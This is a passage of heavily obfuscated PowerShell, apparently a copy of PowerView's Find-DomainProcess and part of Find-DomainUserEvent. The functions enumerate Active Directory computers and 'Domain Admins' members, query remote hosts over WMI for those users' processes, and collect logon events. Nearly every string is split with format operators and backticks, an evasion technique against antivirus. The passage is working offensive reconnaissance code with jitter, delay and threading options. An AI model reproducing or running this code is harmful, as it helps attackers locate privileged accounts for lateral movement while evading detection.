        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{2}{1}{0}" -f'evel','neL','O'}, {"{1}{2}{0}"-f'ee','Su','btr'})]
        [String]
        ${sEar`ch`SCOPe} = ("{0}{1}" -f'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESu`lt`p`AgesI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`VERT`ImelIm`It},

        [Switch]
        ${TOM`Bs`ToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreDE`Nt`ial} =   ${Q`Fn}::"eM`pTy",

        [Switch]
        ${s`TOp`on`suCCess},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`ELaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JI`Tt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thRe`A`dS} = 20
    )

    BEGIN {
        ${CompUT`ERSEa`RC`heraRGUmE`NTs} = @{
            ("{2}{1}{0}"-f's','rtie','Prope') = ("{0}{1}{3}{2}"-f 'dns','h','me','ostna')
        }
        if (${PsBou`N`dP`AraMEt`E`RS}[("{0}{1}"-f 'Do','main')]) { ${c`oMpUt`eRS`EarChErARgu`mEn`Ts}[("{1}{0}{2}" -f'om','D','ain')] = ${dOM`AiN} }
        if (${PsBoU`N`dPAra`MeTErS}[("{3}{1}{0}{4}{2}" -f'Do','mputer','ain','Co','m')]) { ${Com`pU`TERse`Arc`HERA`RgUmEN`TS}[("{0}{1}"-f 'Do','main')] = ${cO`m`p`UteRdOmaIn} }
        if (${PsBou`N`d`PAraMETe`Rs}[("{3}{1}{0}{2}" -f'l','i','ter','ComputerLDAPF')]) { ${C`Omp`Ut`eRS`ea`RC`HerARg`UmeNtS}[("{3}{0}{1}{2}" -f'lt','e','r','LDAPFi')] = ${co`MPuT`e`RL`DapFILT`er} }
        if (${PS`BOUN`Dpar`AmEte`RS}[("{2}{0}{3}{4}{1}" -f 'omput','ase','C','erS','earchB')]) { ${COMpUteRsE`Arc`H`ErarGUM`E`NtS}[("{1}{0}{2}"-f'h','Searc','Base')] = ${cOMPuT`eRSe`Ar`cHBAse} }
        if (${p`sBOUn`D`pARAMeT`eRS}[("{4}{0}{2}{3}{1}" -f 'ncon','ed','str','ain','U')]) { ${COMpute`RsE`AR`CHer`A`RGUMEnts}[("{0}{1}{2}"-f 'Unconstr','a','ined')] = ${uNCoNs`TR`AInED} }
        if (${PSBo`UnDparAmE`T`erS}[("{1}{3}{4}{5}{2}{0}" -f 'm','C','e','omputerOperatingS','y','st')]) { ${Co`mPuTeRsEAr`CHER`A`R`GumENTS}[("{4}{3}{0}{1}{2}"-f 'rating','Sys','tem','pe','O')] = ${O`pEraTiN`G`s`ysTEm} }
        if (${PSboUndp`Ar`A`MEtE`RS}[("{4}{3}{0}{1}{2}"-f'u','terServi','cePack','mp','Co')]) { ${co`mPuTE`Rs`EaRcH`eRArgUMEn`Ts}[("{0}{2}{1}{3}"-f 'Se','vice','r','Pack')] = ${SE`R`VIC`EpAcK} }
        if (${P`S`BoU`N`dPArAmeTe`Rs}[("{0}{4}{3}{5}{1}{2}"-f'Comp','am','e','Si','uter','teN')]) { ${CoM`put`eRseA`RCHErARgUME`NTs}[("{2}{1}{0}"-f'me','teNa','Si')] = ${s`iTENa`Me} }
        if (${P`SbOUnDpaRA`m`E`T`Ers}[("{1}{0}"-f 'r','Serve')]) { ${COMPu`TE`Rs`E`ArcheRarGUm`e`NTS}[("{0}{1}"-f 'Serv','er')] = ${se`Rver} }
        if (${PS`B`OUnD`p`ARam`EterS}[("{3}{0}{1}{2}"-f 'ea','rchSco','pe','S')]) { ${c`omPu`TerSE`Arc`HeRargUM`en`TS}[("{0}{2}{3}{1}"-f 'S','chScope','ea','r')] = ${sea`RcHSC`o`Pe} }
        if (${pSbo`U`ND`paRAM`eTErS}[("{1}{2}{4}{0}{3}"-f'PageSiz','Re','sul','e','t')]) { ${coMPUTers`eaR`c`h`e`R`ARGUm`eNtS}[("{2}{1}{0}" -f 'ize','geS','ResultPa')] = ${r`EsuLT`PaGesiZe} }
        if (${pSbo`Un`dPA`RAMetERS}[("{2}{0}{1}{3}{4}"-f 'erver','T','S','imeLim','it')]) { ${c`O`mPUte`Rs`EArcH`erArg`UMENTs}[("{4}{0}{1}{2}{3}" -f'r','T','i','meLimit','Serve')] = ${sE`Rve`RTim`ElIMIT} }
        if (${p`S`BOUnDParaMe`TERs}[("{2}{1}{0}"-f'ne','o','Tombst')]) { ${COmP`UTeR`se`A`RcHERaR`GumE`NtS}[("{2}{0}{1}"-f 'o','mbstone','T')] = ${toM`Bst`oNe} }
        if (${pSbOuN`dp`ARAM`E`TeRS}[("{3}{2}{1}{0}"-f 'l','ia','dent','Cre')]) { ${comPUTe`RsE`Ar`CHeRaR`GU`me`N`Ts}[("{3}{0}{1}{2}"-f'r','edentia','l','C')] = ${cr`E`DeNTI`AL} }

        ${U`SERS`EAR`cH`eRA`RgumentS} = @{
            ("{2}{1}{0}"-f 'ies','ropert','P') = ("{0}{3}{1}{2}"-f'samac','m','e','countna')
        }
        if (${P`S`BoU`NDPaRAM`et`eRs}[("{1}{2}{0}"-f 'ty','UserIde','nti')]) { ${uSErseA`RchEr`A`RGumen`Ts}[("{1}{0}{2}"-f'ntit','Ide','y')] = ${U`SeRid`EnTity} }
        if (${pSb`OUNDPa`R`AMETe`RS}[("{0}{1}"-f'Doma','in')]) { ${u`SE`R`sEaRC`HERaRg`UmenTS}[("{0}{1}" -f'D','omain')] = ${Do`M`AIn} }
        if (${PSb`oUN`dpARA`mE`TERs}[("{0}{1}{2}"-f'UserDo','ma','in')]) { ${UsER`S`eArCHe`RaR`guMe`N`Ts}[("{0}{1}" -f 'Domai','n')] = ${u`SER`DoMAin} }
        if (${pSbo`UNdPa`Ram`EtERs}[("{0}{1}{3}{2}"-f'Use','rLDA','ilter','PF')]) { ${USE`RsE`A`RchERa`RGum`En`Ts}[("{0}{1}{2}"-f'LD','AP','Filter')] = ${U`s`ERLda`pFilter} }
        if (${p`S`BoUndPar`AmeterS}[("{0}{2}{3}{1}" -f 'U','chBase','serSea','r')]) { ${USeRsE`Ar`c`h`ERARgUm`EnTs}[("{2}{1}{0}" -f'e','s','SearchBa')] = ${u`SeRSeA`RcHba`SE} }
        if (${P`sBO`U`NDPaRam`EterS}[("{1}{3}{2}{0}"-f 't','UserA','minCoun','d')]) { ${USer`S`EArchER`ARGUM`enTs}[("{1}{3}{0}{2}"-f'u','Admi','nt','nCo')] = ${u`s`eRadm`iNcOUnT} }
        if (${p`S`Bou`Ndp`A`RameTeRS}[("{0}{1}"-f 'Se','rver')]) { ${u`SErsEARc`hERARg`U`menTS}[("{0}{1}"-f 'Serve','r')] = ${s`e`RVER} }
        if (${pSBOuND`PAr`AmetE`RS}[("{1}{0}{2}"-f'rchSc','Sea','ope')]) { ${usER`sE`ARcH`eRa`RgU`MEn`Ts}[("{0}{1}{2}{3}"-f'Se','archSc','o','pe')] = ${Se`ArC`HSCOPE} }
        if (${p`s`BoundP`AraM`etErS}[("{4}{2}{1}{3}{0}"-f 'e','a','P','geSiz','Result')]) { ${USeRSE`Ar`CHERARGu`mEN`Ts}[("{1}{2}{0}" -f 'ze','Res','ultPageSi')] = ${result`P`A`GeSIZE} }
        if (${p`sb`oUnDpaRaM`E`TERs}[("{1}{2}{3}{0}" -f'mit','Se','rverTim','eLi')]) { ${UsE`RseARCheR`ARGU`men`TS}[("{1}{0}{2}"-f'ime','ServerT','Limit')] = ${SErvE`R`TIMeLI`MIt} }
        if (${pSboUNdpA`Ram`e`Ters}[("{1}{0}{2}{3}"-f'mbsto','To','n','e')]) { ${Use`R`seARCHera`RG`UmENTS}[("{2}{1}{0}"-f'one','ombst','T')] = ${TO`MbsTo`Ne} }
        if (${PSboUN`d`paR`A`MEteRs}[("{0}{1}{2}" -f'C','re','dential')]) { ${U`Se`RS`EarcheraR`gUMentS}[("{0}{2}{1}"-f'Cre','ial','dent')] = ${crE`d`EntIAL} }


        
        if (${Ps`B`o`UndPaRA`mE`TERs}[("{2}{0}{3}{1}" -f 'u','ame','Comp','terN')]) {
            ${targ`etcoMP`U`TERs} = ${Co`MPu`Te`RNamE}
        }
        else {
            &("{1}{2}{0}{3}"-f'rb','Wr','ite-Ve','ose') ("{3}{7}{8}{1}{5}{4}{0}{6}{2}"-f 'rs in','eryi','omain','[Find-','ute','ng comp',' the d','DomainP','rocess] Qu')
            ${TaRGe`TcOM`PUT`ers} = &("{2}{3}{1}{4}{0}{5}"-f 'te','inComp','Get-Dom','a','u','r') @ComputerSearcherArguments | &("{1}{0}{2}" -f 'ec','Sel','t-Object') -ExpandProperty ("{1}{2}{0}"-f'tname','dnsh','os')
        }
        &("{4}{2}{3}{1}{0}" -f'e','s','i','te-Verbo','Wr') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if (${Ta`R`GET`COMpUTErS}."LEN`G`Th" -eq 0) {
            throw ("{11}{6}{7}{5}{2}{8}{0}{4}{1}{9}{12}{10}{13}{3}"-f ' f','nd','ost','erate','ou','No h','Find-Domain','Process] ','s',' t','e','[','o ','num')
        }

        
        if (${PS`BoUn`DPA`RAM`ETErS}[("{2}{1}{0}" -f'me','essNa','Proc')]) {
            ${taRGet`PR`O`Ce`ssnAME} = @()
            ForEach (${t} in ${pROc`EssN`AME}) {
                ${TArg`etP`ROcESSNA`Me} += ${T}.("{0}{1}"-f 'Spli','t').Invoke(',')
            }
            if (${TArge`Tp`ROcE`ssN`A`ME} -isnot [System.Array]) {
                ${t`ArgEtpROcE`Ss`Na`me} = [String[]] @(${taRG`e`TP`ROcESSNaMe})
            }
        }
        elseif (${PSBouNDpa`R`AMEt`e`RS}[("{3}{1}{2}{0}"-f 'tity','erI','den','Us')] -or ${PSboUnDp`Ar`AMeTE`RS}[("{2}{3}{0}{4}{1}" -f 'DAPFil','er','User','L','t')] -or ${p`SboUn`dpARAm`ETERs}[("{1}{0}{4}{3}{2}"-f'S','User','e','as','earchB')] -or ${pSB`oU`NDPAR`A`m`eTErS}[("{0}{3}{1}{2}"-f'U','un','t','serAdminCo')] -or ${pSbO`U`N`dpaRa`MetERS}[("{4}{0}{1}{3}{2}" -f'low','Delegat','n','io','UserAl')]) {
            ${tARg`ET`UserS} = &("{0}{3}{2}{1}"-f 'Get-','nUser','ai','Dom') @UserSearcherArguments | &("{1}{2}{0}" -f 'ct','Selec','t-Obje') -ExpandProperty ("{1}{0}{2}{3}" -f 'acc','sam','ountn','ame')
        }
        else {
            ${g`RO`UPS`e`ArCH`Erar`gUMEN`TS} = @{
                ("{1}{0}{2}" -f't','Identi','y') = ${U`S`ERGrOUP`iDEN`TiTY}
                ("{0}{1}{2}"-f 'Rec','urs','e') = ${T`RUe}
            }
            if (${PSBoU`N`DpAr`AMe`TErs}[("{1}{0}{2}"-f'rDom','Use','ain')]) { ${gROuPse`ARC`heRArG`UMEn`Ts}[("{0}{1}" -f 'Domai','n')] = ${U`SErdoMA`IN} }
            if (${pSbOu`NdParamE`TE`RS}[("{0}{1}{2}"-f 'U','serSearch','Base')]) { ${GrouPSe`ARCHe`Ra`Rg`UMenTS}[("{1}{0}{2}" -f'earchB','S','ase')] = ${US`ersEA`Rc`HBASE} }
            if (${psb`Oundp`ArAME`TE`Rs}[("{0}{1}" -f 'S','erver')]) { ${G`RouPSEA`RChER`AR`GUMEnTS}[("{1}{0}" -f'r','Serve')] = ${SE`Rv`Er} }
            if (${ps`BOu`N`DPArame`Te`RS}[("{1}{0}{2}" -f 'c','SearchS','ope')]) { ${gr`oU`ps`eaRcH`Er`ARgUm`EntS}[("{0}{2}{1}"-f 'Searc','cope','hS')] = ${sEarCh`S`co`pE} }
            if (${PS`BO`UnDPa`RAmeTerS}[("{3}{4}{2}{0}{1}"-f'g','eSize','a','Re','sultP')]) { ${GrO`U`p`sE`ARch`eraRG`UmENTs}[("{1}{2}{0}"-f 'ze','Res','ultPageSi')] = ${RES`Ult`pAGesIZe} }
            if (${pSbo`UNDpar`A`M`eT`eRS}[("{3}{0}{2}{1}"-f 'verTim','it','eLim','Ser')]) { ${gr`OuP`SeAR`CHeRA`RG`UmEnts}[("{2}{0}{3}{1}{4}"-f 'v','im','Ser','erT','eLimit')] = ${s`ErvertiM`E`l`imIT} }
            if (${pS`BOunDParA`METE`RS}[("{1}{0}{3}{2}" -f 'o','T','ne','mbsto')]) { ${g`R`OUp`SeA`RCH`EraRgUMENTS}[("{1}{2}{0}" -f'e','Tom','bston')] = ${tO`mBsTo`NE} }
            if (${PSBOU`NdPaRa`metE`RS}[("{2}{1}{0}" -f'al','edenti','Cr')]) { ${gr`oUpsE`ARCHe`Ra`RgUMe`NtS}[("{2}{1}{0}" -f 'l','dentia','Cre')] = ${C`REDEnt`I`Al} }
            ${gr`OUPS`Ea`R`cH`eR`ArgUmE`NtS}
            ${t`Ar`Ge`TuSeRs} = &("{1}{2}{4}{3}{0}" -f 'mber','G','et-Dom','nGroupMe','ai') @GroupSearcherArguments | &("{2}{1}{0}"-f'-Object','ct','Sele') -ExpandProperty ("{2}{1}{0}" -f'me','a','MemberN')
        }

        
        ${ho`STEN`UmB`LO`cK} = {
            Param(${COMpUTer`N`A`Me}, ${PR`O`c`ESsName}, ${T`ArgEtU`serS}, ${c`Re`DeNt`Ial})

            ForEach (${taRge`TCOmP`UTEr} in ${C`om`P`UTeRn`AME}) {
                ${U`P} = &("{0}{2}{1}" -f'Tes','Connection','t-') -Count 1 -Quiet -ComputerName ${TARGEtC`oMP`UteR}
                if (${U`P}) {
                    
                    
                    if (${C`ReDEN`TIAl}) {
                        ${Pro`C`esSes} = &("{0}{3}{1}{2}" -f'Get-WM','o','cess','IPr') -Credential ${cR`e`denTIal} -ComputerName ${ta`RGetCom`p`UTer} -ErrorAction ("{3}{1}{2}{0}" -f'nue','Cont','i','Silently')
                    }
                    else {
                        ${PRo`ce`Ss`es} = &("{1}{0}{2}{3}"-f 'MIPro','Get-W','c','ess') -ComputerName ${tAr`geTCo`M`Pu`Ter} -ErrorAction ("{0}{1}{2}{3}" -f'SilentlyC','onti','n','ue')
                    }
                    ForEach (${PROC`e`SS} in ${prOC`eS`sEs}) {
                        
                        if (${pR`O`cEssnaME}) {
                            if (${P`R`OCe`SSNAmE} -Contains ${pR`OcE`ss}."PRoc`Ess`Name") {
                                ${Pr`oc`ESs}
                            }
                        }
                        
                        elseif (${targ`eT`UseRS} -Contains ${PRoC`e`SS}."U`sEr") {
                            ${P`RO`CEss}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${psboU`NdpArAME`T`ErS}[("{0}{1}" -f 'Dela','y')] -or ${Psbo`Und`pArA`METeRS}[("{1}{2}{3}{0}"-f's','StopO','nSu','cces')]) {

            &("{1}{3}{2}{0}" -f'e','Write','os','-Verb') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &("{1}{0}{2}" -f'erbo','Write-V','se') ('[F'+'i'+'nd-Doma'+'inProcess'+'] '+'D'+'elay:'+' '+"$Delay, "+'J'+'itt'+'er: '+"$Jitter")
            ${c`OUNTER} = 0
            ${r`A`NDNO} = &("{0}{1}{2}"-f 'New-Ob','jec','t') ("{1}{3}{2}{0}"-f 'dom','S','m.Ran','yste')

            ForEach (${t`ARg`e`TcOMp`UTEr} in ${ta`RgETc`OmP`UTE`RS}) {
                ${co`Un`TeR} = ${c`ou`NtER} + 1

                
                &("{0}{2}{1}" -f'Start','p','-Slee') -Seconds ${RANd`No}.("{0}{1}" -f 'Nex','t').Invoke((1-${J`ITt`eR})*${D`ELaY}, (1+${j`i`TteR})*${DeL`AY})

                &("{3}{4}{1}{2}{0}"-f'se','rb','o','Write-','Ve') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${REs`U`lT} = &("{1}{3}{2}{0}" -f'd','I','e-Comman','nvok') -ScriptBlock ${hOsT`E`NUm`BLOck} -ArgumentList ${T`ARGeT`cOMP`U`Ter}, ${tArgE`T`P`RocEsSn`AmE}, ${ta`RGE`TUsE`Rs}, ${CreDe`NTi`AL}
                ${Re`sU`LT}

                if (${r`ESULT} -and ${s`ToPo`NSU`c`CESs}) {
                    &("{2}{0}{1}"-f 'rite-Verb','ose','W') ("{9}{12}{5}{4}{16}{13}{3}{2}{0}{11}{7}{1}{8}{10}{15}{6}{14}" -f' us','e','Target',' ','Do','ind-','g ea',' found, r','turn','[','i','er','F','rocess]','rly','n','mainP')
                    return
                }
            }
        }
        else {
            &("{3}{0}{1}{2}" -f'te-V','erb','ose','Wri') ('[Find-'+'Dom'+'ainProcess'+'] '+'U'+'s'+'ing '+'thr'+'eadi'+'ng '+'w'+'ith '+'th'+'re'+'a'+'ds: '+"$Threads")

            
            ${scrI`PtPA`R`AmS} = @{
                ("{0}{3}{2}{1}" -f 'P','ame','N','rocess') = ${TArgE`TProc`E`sSName}
                ("{1}{0}{2}"-f 'g','Tar','etUsers') = ${t`ARGE`TuseRS}
                ("{1}{0}{2}"-f'edenti','Cr','al') = ${c`R`eDENti`Al}
            }

            
            &("{4}{1}{2}{0}{3}"-f'dFunctio','w-Thre','ade','n','Ne') -ComputerName ${tArgEt`Com`pUT`ErS} -ScriptBlock ${h`Os`TeN`UmBLock} -ScriptParameters ${sCrip`Tp`ARAmS} -Threads ${tH`Reads}
        }
    }
}


function fi`ND-dOmAIn`U`sEr`EvEnT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{0}{3}{2}"-f'o','PS','s','uldProces','Sh'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{2}{6}{5}{3}{1}{7}"-f'ar','ig','e','hanAss','PSUseDecl','arsMoreT','dV','nments'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{4}{2}"-f'sePSCredentia','SU','pe','P','lTy'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{9}{5}{7}{1}{4}{2}{8}{6}{0}{3}"-f 'rPasswor','U','i','d','s','Av','Fo','oid','ngPlainText','PS'}, '')]
    [OutputType({"{3}{1}{4}{0}{2}"-f'.Lo','rVie','gonEvent','Powe','w'})]
    [OutputType({"{8}{6}{0}{1}{5}{2}{3}{4}{7}"-f'r','View.','licitCredenti','alLo','g','Exp','we','on','Po'})]
    [CmdletBinding(dEFaulTParametErseTNamE = {"{1}{0}"-f 'main','Do'})]
    Param(
        [Parameter(paRAmetErseTnAmE = "cOMPUTEr`Na`me", pOSiTion = 0, valuEFrOmpipElIne = ${t`RUe}, ValueFRoMpiPeLiNEbypRoPErTYName = ${TR`Ue})]
        [Alias({"{1}{2}{0}" -f'tname','dnsho','s'}, {"{1}{0}"-f'ostName','H'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoMPU`TERN`Ame},

        [Parameter(ParAMetERSETNAme = "Doma`IN")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`in},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${fi`L`TEr},

        [Parameter(vaLuefrOmPiPeLINEBYpRoperTynaME = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${stAr`TT`ImE} =   ( diR ('va'+'rIAble:j'+'1L'+'gm'))."Val`UE"::"n`ow".("{2}{0}{1}" -f'ay','s','AddD').Invoke(-1),

        [Parameter(ValuEFrOMpIpeLINeBYprOpeRTyNAme = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${En`DtI`mE} =  ${J1l`gm}::"n`OW",

        [ValidateRange(1, 1000000)]
        [Int]
        ${m`AXeVe`Nts} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${uSeRi`d`e`NTITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${us`ErDOm`Ain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`sERldapFi`L`T`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${uSeR`SeaR`CHB`A`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}" -f'Gr','a','me','oupN'}, {"{1}{0}"-f'p','Grou'})]
        [String[]]
        ${Us`erGroU`P`idenTI`Ty} = ("{0}{2}{1}{3}"-f'Do','Adm','main ','ins'),

        [Alias({"{1}{2}{0}" -f'ount','Admi','nC'})]
        [Switch]
        ${US`eradMInc`o`U`Nt},

        [Switch]
        ${chECKAC`c`esS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{2}{0}{1}" -f'l','ler','Contro','omain','D'})]
        [String]
        ${ser`VEr},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{1}{0}{2}"-f 'eLe','On','vel'}, {"{2}{0}{1}" -f're','e','Subt'})]
        [String]
        ${seArc`Hs`c`OPe} = ("{1}{0}" -f'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`e`Sul`TPaG`ESIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RV`e`RTim`el`IMiT},

        [Switch]
        ${TOM`B`StonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Crede`NT`i`Al} =   (  gET-VARIABle ('q'+'fn') )."Val`Ue"::"e`mpty",

        [Switch]
        ${St`OP`OnSUcC`Ess},

        [ValidateRange(1, 10000)]
        [Int]
        ${d`E`laY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jITT`Er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${Th`R`eAdS} = 20
    )

    BEGIN {
        ${UsErSEarChER`A`R`G`U`M`eNtS} = @{
            ("{1}{3}{2}{0}" -f 'es','Pro','rti','pe') = ("{0}{3}{2}{1}" -f'sama','ountname','c','c')
        }
        if (${pS`Bo`UNDPaRAmE`TERs}[("{1}{2}{0}{3}" -f 'i','UserIde','nt','ty')]) { ${U`SersEarChEr`ARGume`NtS}[("{2}{1}{0}" -f 'ty','denti','I')] = ${U`sERiDENT`ity} }
        if (${pSbOUndp`AR`AMeTe`RS}[("{2}{0}{1}"-f 'serD','omain','U')]) { ${UsErSEAR`c`heRarGUM`entS}[("{1}{0}" -f 'in','Doma')] = ${U`sE`RDOMain} }
        if (${ps`Bou`NdPar`AMeTErs}[("{0}{2}{3}{4}{1}" -f 'User','er','LD','APFi','lt')]) { ${u`se`RsEaRChe`Ra`Rg`U`MEnTS}[("{2}{1}{0}"-f'ter','PFil','LDA')] = ${U`serLdapfi`L`T`ER} }
        if (${PSB`Oun`DpA`RamEt`E`Rs}[("{3}{2}{0}{1}"-f'hBas','e','rSearc','Use')]) { ${USerseA`RchEr`A`RGU`ME`Nts}[("{2}{0}{1}" -f'earch','Base','S')] = ${U`seRSe`ARC`HBa`se} }
        if (${Ps`BoUNDPara`m`ete`RS}[("{0}{1}{3}{2}"-f'UserAdmi','n','nt','Cou')]) { ${use`RSE`ArCHer`ArG`UMen`Ts}[("{1}{0}{2}" -f 'C','Admin','ount')] = ${Us`ERA`dMin`C`ounT} }
        if (${PSb`oun`dpARAMET`Ers}[("{2}{0}{1}" -f'e','r','Serv')]) { ${U`S`E`RseA`RcHEraRGUmenTS}[("{1}{0}"-f 'rver','Se')] = ${s`eRv`Er} }
        if (${P`Sbou`NDPARAM`ETErS}[("{2}{0}{1}" -f'ar','chScope','Se')]) { ${uSeR`SearC`H`ERA`RguM`enTS}[("{0}{1}{2}" -f'S','ear','chScope')] = ${Se`Arc`H`sCOPe} }
        if (${PSboUN`dPaRAm`E`TerS}[("{0}{2}{3}{1}" -f'Resul','e','tPage','Siz')]) { ${USe`RseArcheR`AR`gu`MeN`Ts}[("{3}{0}{4}{2}{1}" -f'sul','ize','PageS','Re','t')] = ${Re`s`ULtpA`gESiZe} }
        if (${PsboUnD`ParamEt`E`Rs}[("{3}{2}{0}{1}" -f 'L','imit','ime','ServerT')]) { ${us`ER`Sea`RcHER`AR`Gu`meNTs}[("{4}{3}{2}{0}{1}" -f'L','imit','ime','rT','Serve')] = ${Se`RvE`RtIM`Eli`Mit} }
        if (${p`SBOuND`Para`MetE`RS}[("{1}{2}{0}"-f 'one','Tomb','st')]) { ${uS`ER`sE`ArCHERArGU`m`e`NTs}[("{0}{1}" -f'To','mbstone')] = ${TOM`Bs`TOnE} }
        if (${PSbo`UN`dpa`RaM`eTerS}[("{1}{2}{0}" -f 'al','Creden','ti')]) { ${UsE`RS`EaR`cheRARGUM`E`N`TS}[("{1}{2}{0}" -f'ntial','Cr','ede')] = ${c`ReDEN`TIal} }

        if (${p`SbOun`DPArA`MeTERs}[("{3}{0}{2}{1}"-f'ser','ty','Identi','U')] -or ${PSbo`UN`dp`ARa`Met`ERs}[("{3}{2}{1}{0}{4}"-f 'PFil','A','erLD','Us','ter')] -or ${PSbOUNdpaR`AMeT`e`RS}[("{3}{0}{1}{4}{2}" -f'S','ear','e','User','chBas')] -or ${ps`Boun`D`P`AraM`EteRS}[("{3}{0}{1}{2}" -f'd','minCoun','t','UserA')]) {
            ${tArget`U`SeRS} = &("{0}{4}{3}{1}{2}" -f 'Get-','ainUse','r','m','Do') @UserSearcherArguments | &("{1}{0}{2}" -f 'elect-Ob','S','ject') -ExpandProperty ("{1}{4}{3}{0}{2}"-f 'ccou','s','ntname','ma','a')
        }
        elseif (${psbOU`NdP`A`R`AmeTErS}[("{0}{2}{1}{3}"-f 'UserGr','p','ou','Identity')] -or (-not ${pSBOUN`dpAr`AmetE`Rs}[("{2}{1}{0}"-f 'ter','l','Fi')])) {
            
            ${gRoUpsEaR`cherarG`U`MeN`TS} = @{
                ("{0}{1}{2}" -f 'Identi','t','y') = ${uSErGro`U`PI`DenTi`TY}
                ("{0}{2}{1}" -f 'R','curse','e') = ${TR`Ue}
            }
            &("{4}{3}{1}{2}{0}" -f 'se','e','rbo','-V','Write') ('Us'+'erG'+'rou'+'pIdent'+'it'+'y: '+"$UserGroupIdentity")
            if (${p`sBo`UNdPAraM`e`T`erS}[("{0}{3}{2}{1}" -f'User','ain','om','D')]) { ${GROupsEarCheR`A`RgUme`NTs}[("{0}{1}"-f'Do','main')] = ${U`Se`Rdo`mAin} }
            if (${PSB`o`UNDpaRa`MEt`ers}[("{1}{0}{2}" -f 'rSearc','Use','hBase')]) { ${G`RoUPS`ea`RC`HeRARG`UmeNTs}[("{1}{0}{2}" -f 'rch','Sea','Base')] = ${useRsEa`R`C`HbaSE} }
            if (${pS`BO`UN`dPARAMeTeRs}[("{1}{0}"-f'rver','Se')]) { ${grO`UPseaR`c`heRa`RgUMen`TS}[("{1}{0}"-f 'erver','S')] = ${s`eRVeR} }
            if (${P`SBOuNDP`A`RA`MET`Ers}[("{1}{2}{0}"-f 'Scope','Sea','rch')]) { ${grOuPseArCh`EraRgum`e`NtS}[("{2}{1}{0}"-f'ope','earchSc','S')] = ${sEAR`C`HSc`OpE} }
            if (${PSBo`U`Nd`PaRaMETErS}[("{2}{1}{0}" -f 'ze','tPageSi','Resul')]) { ${gr`oUps`EARCHERa`RgumEn`Ts}[("{3}{1}{0}{2}"-f'sultP','e','ageSize','R')] = ${rESULTP`A`G`E`sizE} }
            if (${psB`OUNdpAr`A`M`eTeRS}[("{1}{0}{2}{4}{3}" -f'e','Serv','rTi','mit','meLi')]) { ${g`Ro`UPse`A`RCHER`ARGumeN`Ts}[("{0}{2}{1}" -f 'S','it','erverTimeLim')] = ${s`ER`VeRtImE`liM`iT} }
            if (${pSB`oU`NdpAr`AM`EtE`Rs}[("{0}{3}{2}{1}" -f 'T','bstone','m','o')]) { ${grouP`s`Ea`RcheR`ARgUm`eN`TS}[("{1}{2}{0}{3}" -f'n','Tombs','to','e')] = ${To`MbsTo`NE} }
            if (${PsBOu`N`DparaMe`TErS}[("{2}{3}{0}{1}"-f'denti','al','Cr','e')]) { ${GRou`PsearcH`E`RAR`Gu`MENTS}[("{1}{2}{0}" -f'ial','C','redent')] = ${cr`EdE`NtiAL} }
            ${tARG`et`US`ErS} = &("{1}{2}{0}{3}{5}{4}"-f'omain','Ge','t-D','Gr','ber','oupMem') @GroupSearcherArguments | &("{1}{3}{4}{2}{0}"-f 'ct','Se','Obje','lect','-') -ExpandProperty ("{2}{0}{3}{1}"-f 'e','berName','M','m')
        }

        
        if (${pSBOuND`pAr`A`Met`eRs}[("{1}{2}{0}" -f'rName','Compu','te')]) {
            ${TaR`GeTcomp`U`T`ErS} = ${comPuT`E`RN`AmE}
        }
        else {
            
            ${DCSEA`RCHerar`g`U`menTS} = @{
                ("{1}{0}"-f 'AP','LD') = ${TR`UE}
            }
            if (${pSbO`UN`D`P`ArAM`eters}[("{1}{0}" -f'n','Domai')]) { ${DCSe`Arch`eraRG`UMeN`TS}[("{1}{2}{0}" -f 'in','Do','ma')] = ${doMa`iN} }
            if (${PSB`Ou`NdpAra`METerS}[("{2}{0}{1}"-f 'erve','r','S')]) { ${DcsEaR`Ch`e`RARG`U`mE`NTS}[("{1}{2}{0}" -f 'r','Ser','ve')] = ${sEr`VER} }
            if (${pSbouNdp`A`RAMET`eRs}[("{0}{2}{1}" -f 'Credent','al','i')]) { ${d`CS`eARc`H`Era`RgUmeN`TS}[("{2}{0}{1}{3}" -f'rede','n','C','tial')] = ${cRe`Den`T`iAL} }
            &("{1}{3}{0}{2}"-f'o','Write-Ver','se','b') ('['+'Find-Domai'+'n'+'User'+'Eve'+'nt'+'] '+'Que'+'ryi'+'ng '+'f'+'or '+'doma'+'in '+'c'+'ontrolle'+'rs '+'i'+'n '+'dom'+'ain'+': '+"$Domain")
